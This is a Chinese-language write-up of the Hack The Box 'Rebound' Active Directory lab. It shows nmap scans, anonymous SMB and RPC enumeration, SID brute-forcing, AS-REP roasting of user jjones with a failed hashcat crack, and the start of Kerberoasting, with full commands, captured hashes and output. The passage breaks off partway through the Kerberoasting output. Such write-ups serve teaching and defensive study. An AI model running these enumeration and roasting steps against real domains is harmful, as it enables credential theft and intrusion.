---
title: HTB-Rebound Writeup
date: 2026-08-06T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - RPC
  - 时钟偏差
  - AS-REP-Roasting
  - Kerberoasting
---

## Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]                                                                                                                                   
└─$ sudo nmap --min-rate 10000 -p- 10.129.232.31 -oA Nmap/Ports                                                                                                         
[sudo] password for kali:                                                                                                                                               
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-03 22:10 -0400                                                                                                       
Nmap scan report for 10.129.232.31                                                                                                                                      
Host is up (0.077s latency).                                                                                                                                            
Not shown: 65510 closed tcp ports (reset)                                                                                                                               
PORT      STATE SERVICE                                                                                                                                                 
53/tcp    open  domain                                                                                                                                                  
88/tcp    open  kerberos-sec                                                                                                                                            
135/tcp   open  msrpc                                                                                                                                                   
139/tcp   open  netbios-ssn                                                                                                                                             
389/tcp   open  ldap                                                                                                                                                    
445/tcp   open  microsoft-ds                                                                                                                                            
464/tcp   open  kpasswd5                                                                                                                                                
593/tcp   open  http-rpc-epmap                                                                                                                                          
636/tcp   open  ldapssl                                                                                                                                                 
3268/tcp  open  globalcatLDAP                                                                                                                                           
3269/tcp  open  globalcatLDAPssl                                                                                                                                        
5985/tcp  open  wsman                                                                                                                                                   
9389/tcp  open  adws                                                                                                                                                    
47001/tcp open  winrm                                                                                                                                                   
49664/tcp open  unknown                                                                                                                                                 
49665/tcp open  unknown                                                                                                                                                 
49666/tcp open  unknown                                                                                                                                                 
49668/tcp open  unknown                                                                                                                                                 
49675/tcp open  unknown                                                                                                                                                 
49692/tcp open  unknown                                                                                                                                                 
49693/tcp open  unknown                                                                                                                                                 
49696/tcp open  unknown                                                                                                                                                 
49701/tcp open  unknown                                                                                                                                                 
49723/tcp open  unknown                                                                                                                                                 
49743/tcp open  unknown                                                                                                                                                 
                                                                                                                                                                        
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

提取其中的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ grep open Nmap/Ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49675,49692,49693,49696,49701,49723,49743

```

## Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49675,49692,49693,49696,49701,49723,49743 10.129.232.31
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-03 22:20 -0400
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 56.00% done; ETC: 22:20 (0:00:17 remaining)
Nmap scan report for 10.129.232.31
Host is up (0.090s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-04 09:19:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-04T09:21:09+00:00; +6h59m36s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb,、 DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2026-08-04T09:21:10+00:00; +6h59m36s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-04T09:21:09+00:00; +6h59m36s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb, DNS:rebound.htb, DNS:rebound
| Not valid before: 2025-03-06T19:51:11
|_Not valid after:  2122-04-08T14:05:49
|_ssl-date: 2026-08-04T09:21:10+00:00; +6h59m36s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49693/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
49743/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 1903 (93%), Microsoft Windows Server 2012 (93%), Windows Server 2019 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 (92%), Microsoft Windows 10 21H1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-04T09:21:03
|_  start_date: N/A
|_clock-skew: mean: 6h59m35s, deviation: 0s, median: 6h59m35s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.26 seconds

```

有 26 个端口开放，Kerberos（88）、ldap/ldaps（389/636）、Global Catalog（3268/3269）、NDS（53）等经典 AD 服务端口，且 Nmap 显示均表明这是一台 Windows 域控制器。

将暴露出来的域名做 DNS 解析。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo bash -c ' echo "10.129.232.31 rebound.htb dc01.rebound.htb" >> /etc/hosts'
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ tail -n 1 /etc/hosts
10.129.232.31 rebound.htb dc01.rebound.htb 
```

## SMB 匿名访问

使用 smbmap 进行枚举，失败。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ smbmap -H rebound.htb

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Access denied on 10.129.232.31, no fun for you...                                                                        
[*] Closed 1 connections 
```

使用 smbclient 再次枚举得到结果。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ smbclient -L 10.129.232.31 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.232.31 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

继续用 nxc 做验证。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ nxc smb rebound.htb --shares -u enil -p ''
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\enil: (Guest)
SMB         10.129.232.31   445    DC01             [*] Enumerated shares
SMB         10.129.232.31   445    DC01             Share           Permissions     Remark
SMB         10.129.232.31   445    DC01             -----           -----------     ------
SMB         10.129.232.31   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.31   445    DC01             C$                              Default share
SMB         10.129.232.31   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.31   445    DC01             NETLOGON                        Logon server share 
SMB         10.129.232.31   445    DC01             Shared          READ            
SMB         10.129.232.31   445    DC01             SYSVOL                          Logon server share 
```

Shared 文件夹的内容为空。

## RPC 枚举

尝试 rpc 匿名登录，发现开启了 lsaquery，并给出了 SID。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ rpcclient -U '' -N 10.129.232.31     
rpcclient $> ls
command not found: ls
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> getdompwinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> lsaquery
Domain Name: rebound
Domain Sid: S-1-5-21-4078382237-1492182817-2568127209
```

使用 lookupsid 进行枚举，并将结果保存。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ impacket-lookupsid anonymous@10.129.232.31 20000 | tee rpcscan.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.232.31
[*] StringBinding ncacn_np:10.129.232.31[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
514: rebound\Domain Guests (SidTypeGroup)
515: rebound\Domain Computers (SidTypeGroup)
516: rebound\Domain Controllers (SidTypeGroup)
517: rebound\Cert Publishers (SidTypeAlias)
518: rebound\Schema Admins (SidTypeGroup)
519: rebound\Enterprise Admins (SidTypeGroup)
520: rebound\Group Policy Creator Owners (SidTypeGroup)
521: rebound\Read-only Domain Controllers (SidTypeGroup)
522: rebound\Cloneable Domain Controllers (SidTypeGroup)
525: rebound\Protected Users (SidTypeGroup)
526: rebound\Key Admins (SidTypeGroup)
527: rebound\Enterprise Key Admins (SidTypeGroup)
553: rebound\RAS and IAS Servers (SidTypeAlias)
571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
1000: rebound\DC01$ (SidTypeUser)
1101: rebound\DnsAdmins (SidTypeAlias)
1102: rebound\DnsUpdateProxy (SidTypeGroup)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)

```

提取出枚举出来的 用户名，输出为一个字典。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ grep rebound rpcscan.txt | awk -F '\' '{print $2}' | awk -F '(' '{print $1}' | tee Users.txt
Enterprise Read-only Domain Controllers 
Administrator 
Guest 
krbtgt 
Domain Admins 
Domain Users 
Domain Guests 
Domain Computers 
Domain Controllers 
Cert Publishers 
Schema Admins 
Enterprise Admins 
Group Policy Creator Owners 
Read-only Domain Controllers 
Cloneable Domain Controllers 
Protected Users 
Key Admins 
Enterprise Key Admins 
RAS and IAS Servers 
Allowed RODC Password Replication Group 
Denied RODC Password Replication Group 
DC01$ 
DnsAdmins 
DnsUpdateProxy 
ppaul 
llune 
fflock 
jjones 
mmalone 
nnoon 
ldap_monitor 
oorend 
ServiceMgmt 
winrm_svc 
batch_runner 
tbrady 
delegator$
```

## AS-REP Roasting

使用 GetNPUsers 获取到了 jjones 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.129.232.31 rebound.htb/ -usersfile Users.txt  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:18444cbbc3387792eb1265e3826515aa$2811336cee8acb0675c0c12e1fb3dcc859a5a1e590c3229b202980fb0e63f157050c129d24040845bed3974713019787868441f288b9d3400288a4488c25df0201af952161b17a936dc53a0b6e195b39349fa3c4d1931b09ce5e405f63c87b08989901c33a06bba613bb0450db88073b82019f00833034cd44f1f727fc2af6c294f96c4b1cd7f98bc1b25de7ae4a93de2412eb507ed1dfb611030ba048dbd430dd64293f721b40df9af3c9d4f9435b9c2aa5999622886333ae990628143e3d527bf824e66c482c1ba831a4fabc3371cfa9d8664d83ce31a8def0ce671483b0f55e7b79136b2d277ea3cb
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ vim jjones.hash
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ cat jjones.hash 
$krb5asrep$23$jjones@REBOUND.HTB:18444cbbc3387792eb1265e3826515aa$2811336cee8acb0675c0c12e1fb3dcc859a5a1e590c3229b202980fb0e63f157050c129d24040845bed3974713019787868441f288b9d3400288a4488c25df0201af952161b17a936dc53a0b6e195b39349fa3c4d1931b09ce5e405f63c87b08989901c33a06bba613bb0450db88073b82019f00833034cd44f1f727fc2af6c294f96c4b1cd7f98bc1b25de7ae4a93de2412eb507ed1dfb611030ba048dbd430dd64293f721b40df9af3c9d4f9435b9c2aa5999622886333ae990628143e3d527bf824e66c482c1ba831a4fabc3371cfa9d8664d83ce31a8def0ce671483b0f55e7b79136b2d277ea3cb

```

破解失败，再次操作保存 hash 以确保 hash 的完整性，这次直接将 NPUsers 的结果保存为 txt 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.129.232.31 rebound.htb/ -usersfile User_jjones.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$jjones@REBOUND.HTB:b48ed550cfde7f51659518a444fc807d$d711889349efbaa86ef2aa3a0e4b32daa47a353819e054ea5caf27324ef30b4b16beec14070f9d3647341ac8a727c44855d91da38082d7b8963995562a477fffce9c19d65d576304423f747eb38e08ba579ef1ea6ab2a204a4c5086cfe33c47cf186da4a182dd7b1d46a864cb549fbcce037a5285872aad30c536abe52bffa169c3ac51212f4617db6d75a049379f6ad845482a4213fce9704555cf6fc84e7f9284605f0896889abdb68fc0d77ae9db0b870a9e0b5a9a7ea8fd1f6f2b1c6c232eca5f4d6f8a9565014fd26857c9aac0f6b79f07d01737b06453279c9cfb975f99d62f01b62aaa092f778
                                                                                                         
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ impacket-GetNPUsers -no-pass -dc-ip 10.129.232.31 rebound.htb/ -usersfile User_jjones.txt > jjones_hash.txt
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ vim jjones_hash.txt 
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ cat jjones_hash.txt 
$krb5asrep$23$jjones@REBOUND.HTB:8dcba14f1d21db7816e5b4e3da6b27f1$f4e550bf67aeed3a75f5dc81792693bac68c1eb77d5409119aada7de6766b81dd645d5f6757117ae69888e5fbf0531f9d755a320a0d2f509100ac6a35095f16c3bfc02d16894e1db8b4be2ab57a29dc8d99f873c53e7f62b18be25e7418c843faa5da4213ca24ef6228661ef5e25ac915cd44487418d4caf2edacc07be144ce70bbb4ce7a5d9f5db97541ff1e6bed7716733f60a35ad5436a274ce6c019bb0def0b1fc9e874920dfcdbafcba818fc1a7db5e0d39332cf272dd9ef10200ccba624a25b8c35e2b622a721f5d2b0b74314672ba3d4ace5aae9352ac50ead838f782f9f7529ca75462cd3b78

```

使用 hashcat 进行破解，仍然失败。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ hashcat -m 18200 jjones_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (28119 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$jjones@REBOUND.HTB:8dcba14f1d21db7816...cd3b78
Time.Started.....: Mon Aug  3 23:05:36 2026 (4 secs)
Time.Estimated...: Mon Aug  3 23:05:40 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3512.6 kH/s (1.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...:  kristenanne -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Util: 61%

Started: Mon Aug  3 23:05:35 2026
Stopped: Mon Aug  3 23:05:42 2026
```

使用 GetUserSPNs 得到 ldap_monitor 与 delegator 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Rebound]
└─$ sudo impacket-GetUserSPNs -no-preauth jjones -usersfile Users.txt -dc-ip dc01.rebound.htb rebound.htb/
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: Enterprise Read-only Domain Controllers - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$0f0abd3339dd5db0f792f17a$67ef886045e01d5003fa37cb3289b2f67824f634a6758d46c1cf892114e7a458aeb8508e0a97f452ed41142aa5cf49fc7eae599f12bccbab6c0627c4a7f8c32ecd17f08dbd8e8e29127d3c93e1e88645319704c0354ead331c39d64a962412ee53ceb88c1dd419bed5e2eeb70e3cd15256df3af9649fb460cc0e0889ae8a3619055be9cd68d37799ec7768026d6bfef9a144a6f68d8a9cb101092f3659248d7ba48e9fc7ebfa92bd66b576e99734c965b96e47033e4c5050dcde7d9e218cefdd4337d5c9d9bb1a6f85bbcd85355eb782a652cf85383872a6787ee66c365655b2e5d9dd0a20196ee5a88ff95d54e64f7d054d1db0a7c63ce7ff155a0b5ea51b7ca8b340d2d2cd3936a2e1e82911eb3aab6239b7ded39ac7c0ab230dc371463c09f248644c96e6953ba6a79b316cad99ad5a4427a29f5a1f94a7645f9b33ddc4c23b252ad9ca8caf1e17eb9e27205481534c20ca91e1c36c610b201a6af9734c739442c8287cbcb589c2a3d04bf1a88cfb6e27f48c46dfa71e6ced76f26c4465d684889f0b400bd61bb6a5a0c5fc4d49e5d94b1009b1eeb9e2da625558b27a59c00ff9152c09e940c4307fd27e19767213e62105b276c39171ee651f18dfd0720ba87d0b17e194b03e8b82e488bb8e3eae195e3b31df72fc4273f7a9de5c80edfdfed47961d7d9a2a34d6da96e4c82e35ee04b8f34ff299ea72a5f0fe9bce91b857ec0576f2ec5b4e326facf97486b32d3802e9da320e850c0968e35b4632db0366a39c199ce7ac50d50892fa8cbb60810daa2b26c7f5204976cddd3f375f1e961b7ca3ec4d5cd0eed14530d6839b4181dfa6fa1a33cf95ee081e0ac590e38eee4c9ac5b6302fa6675905c92421876d6b342bb158445e62df17b7be5a25fcbb5d206be3b6dd1a1e0f7bd4cb23fba579cb6707cb24477ef6fc37903503861d1036d4731204a9fa6795e01c2f9433ed34beabc877fb017ede66e87ac7d6a2b5757f4a8e660fd0816b2a654e405f6f903d1fb3ddd1dcf92ae13d9aa59a2c5f9e921fa9cc0e11fa813499131c9ecd90029e598831c831704e9e25b4a6f305db26ebfab8e82a7edded0755a8a61dd3268b5df926e4e0340d9e649c7ef06dbfe4d0789d267521f70a4a74ea278480ce822b49af3c71f54d4925805d458323ef787926c9e9a8b3f0a8ed5f6220146a0cf7491491e27cf4f078aa59f193b77e9399e012eb9914b16427f85067ed4598a2f3eeed6c34edc673adde88b7a8b9c2791f3c427b15eef0723f04b681f3130c813a476b222001c239449f6f1a82a9e9af6a90d02581dd6ddd6c101dba2d8f9bd2f5f2e853544f173868a4e751e3f72a970a5bbea6fe3794ebfbaabcffb70de23d0fca8c4fdbb085c306b1ffc2d9d3bd431f594f7370bca1c78b1a3a0b2e8c5fddf33e54bdef1d1010989085d48192c06067f91ae6f96d0acad33236994ef04a724729f374865dd
[-] Principal: Domain Admins - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Domain Users - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Domain Guests - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Domain Computers - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Domain Controllers - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Cert Publishers - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Schema Admins - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Enterprise Admins - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Group Policy Creator Owners - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Read-only Domain Controllers - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Cloneable Domain Controllers - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Protected Users - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Key Admins - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Enterprise Key Admins - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: RAS and IAS Servers - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Allowed RODC Password Replication Group - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Denied RODC Password Replication Group - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
